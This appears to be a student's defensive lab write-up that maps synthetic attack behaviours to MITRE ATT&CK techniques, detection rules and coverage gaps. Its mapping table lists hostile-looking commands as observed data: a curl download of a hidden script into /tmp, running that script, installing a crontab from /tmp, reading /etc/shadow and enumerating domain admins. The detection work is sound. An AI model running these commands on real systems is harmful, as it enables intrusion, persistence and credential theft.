# Lab 04 — MITRE ATT&CK mapping

**Status:** In progress — the mapping of the synthetic scenarios is written, technique IDs were checked against the ATT&CK data bundled with pySigma, and the linked Sigma rules are validated; the public-dataset techniques are unconfirmed candidates and no Navigator layer exists yet.

## Goal

Map the behaviours in the synthetic lab scenarios to MITRE ATT&CK techniques, link each
one to the data source that shows it and the detection I wrote (or still need),
and see where my coverage has gaps. (Security+ D2 — threat actors & TTPs;
D4 — threat hunting.)

## Setup

- MITRE ATT&CK Enterprise: <https://attack.mitre.org/>
- ATT&CK Navigator (for a coverage heat-map): <https://mitre-attack.github.io/attack-navigator/>
- **Version note:** mapping checked against ATT&CK Enterprise **v19**
  (attack.mitre.org, 2026-09-27). In recent versions the old *Defense
  Evasion* tactic has been split into **Stealth (TA0005)** and **Defense
  Impairment (TA0112)**; older material (and older Security+ books) still say
  "Defense Evasion". All technique IDs below were checked against the ATT&CK
  data bundled with pySigma (v19.2).

## Steps

1. List each observable behaviour from the synthetic scenarios
   ([lab 02](../02-sysmon-auditd-logs/)) and the planned incident write-ups.
2. Find the most specific technique/sub-technique; record the tactic.
3. Record the data source and event that shows it.
4. Link the detection (Sigma rule / Wazuh rule) or mark as **gap**.
5. Export the table to an ATT&CK Navigator layer (optional).

### Mapping table — synthetic scenarios

| # | Observed behaviour (synthetic) | Tactic | Technique | Data source / event | Detection |
|---|-------------------------------|--------|-----------|---------------------|-----------|
| 1 | User opens macro document from Downloads | Initial Access | T1566.001 Phishing: Spearphishing Attachment | Email gateway, Sysmon 1 (WINWORD with `.docm`) | Gap (mail logs not in lab) |
| 2 | Word spawns PowerShell | Execution | T1204.002 User Execution: Malicious File | Sysmon 1 (ParentImage) | [`win_office_spawns_script_interpreter`](../05-sigma-rules/rules/win_office_spawns_script_interpreter.yml) |
| 3 | PowerShell with `-enc` and hidden window | Execution / Stealth | T1059.001 PowerShell; T1027 Obfuscated Files or Information | Sysmon 1 CommandLine, PowerShell 4104 | [`win_powershell_encoded_hidden`](../05-sigma-rules/rules/win_powershell_encoded_hidden.yml) |
| 4 | PowerShell resolves & contacts external host over 443 | Command and Control | T1071.001 Web Protocols | Sysmon 22, Sysmon 3, proxy/firewall logs | Gap — needs reputation/new-domain logic |
| 5 | Executable written to `%APPDATA%` | Command and Control | T1105 Ingress Tool Transfer | Sysmon 11 | Gap (candidate rule) |
| 6 | Run key → `%APPDATA%\SyncHelper\synchelper.exe` | Persistence | T1547.001 Registry Run Keys / Startup Folder | Sysmon 13 | [`win_registry_run_key_user_writable_path`](../05-sigma-rules/rules/win_registry_run_key_user_writable_path.yml) |
| 7 | Regular outbound connections every ~60 s | Command and Control | T1071.001 Web Protocols (beaconing) | Sysmon 3, firewall/NetFlow | Gap — needs time-series analysis |
| 8 | `whoami /all` | Discovery | T1033 System Owner/User Discovery | Sysmon 1 | Gap (noisy alone; use in correlation) |
| 9 | `net group "Domain Admins" /domain` | Discovery | T1069.002 Permission Groups Discovery: Domain Groups | Sysmon 1, Security 4688 | [`win_net_domain_admins_enumeration`](../05-sigma-rules/rules/win_net_domain_admins_enumeration.yml) |
| 10 | 12 failed logons from one external IP in < 3 min | Credential Access | T1110.001 Brute Force: Password Guessing | Security 4625 | [`win_bruteforce_failed_logons_correlation`](../05-sigma-rules/rules/win_bruteforce_failed_logons_correlation.yml) |
| 11 | SSH failures then success for `deploy` from same IP | Credential Access / Initial Access | T1110.001 Password Guessing → T1078 Valid Accounts | auditd USER_AUTH/USER_LOGIN, `auth.log` | Wazuh sshd rules; my Python [`authlog`](../../python/) summary |
| 12 | `curl -o /tmp/.cache-upd.sh http://…` | Command and Control | T1105 Ingress Tool Transfer | auditd EXECVE | [`lnx_download_to_tmp_with_curl_wget`](../05-sigma-rules/rules/lnx_download_to_tmp_with_curl_wget.yml) |
| 13 | `bash /tmp/.cache-upd.sh` | Execution | T1059.004 Unix Shell | auditd EXECVE (key `exec_tmp`) | [`lnx_execution_from_tmp`](../05-sigma-rules/rules/lnx_execution_from_tmp.yml) |
| 14 | `crontab /tmp/.c` | Persistence | T1053.003 Scheduled Task/Job: Cron | auditd (key `cron_mod`), FIM on `/var/spool/cron` | Wazuh FIM; Sigma gap |
| 15 | `cat /etc/shadow` (denied) | Credential Access | T1003.008 OS Credential Dumping: /etc/passwd and /etc/shadow | auditd PATH + SYSCALL (key `shadow_read`) | [`lnx_auditd_shadow_file_access`](../05-sigma-rules/rules/lnx_auditd_shadow_file_access.yml) |
| 16 | Hidden file name `.cache-upd.sh` | Stealth | T1564.001 Hide Artifacts: Hidden Files and Directories | auditd EXECVE / FIM | Gap |

### Candidate techniques for the public-dataset write-ups (to confirm)

| Write-up | Candidate techniques |
|----------|---------------------|
| IR-01 malware-traffic pcap | T1189, T1566, T1204, T1105, T1071.001 |
| IR-02 BOTS v1 | T1595, T1110, T1190, T1505.003, T1491.002, T1091, T1204.002, T1486 |
| IR-03 EVTX password spray | T1110.003 |

### Coverage summary

| Tactic | Behaviours | Detected by my rules | Gaps |
|--------|-----------:|---------------------:|-----:|
| Initial Access | 1 | 0 | 1 |
| Execution | 4 | 3 | 1 |
| Persistence | 2 | 1 | 1 |
| Discovery | 2 | 1 | 1 |
| Credential Access | 3 | 3 | 0 |
| Command and Control | 4 | 1 | 3 |
| Stealth | 2 | 1 | 1 |

(Row 3 and row 11 count towards two tactics each.) Biggest gap: **C2 /
network-based detection** → next step is Zeek or Suricata in the lab.

## Evidence

- ATT&CK Navigator layer JSON exported to this folder (optional) and a
  screenshot of the heat-map.

## What I learned

_To be completed by Lucas._
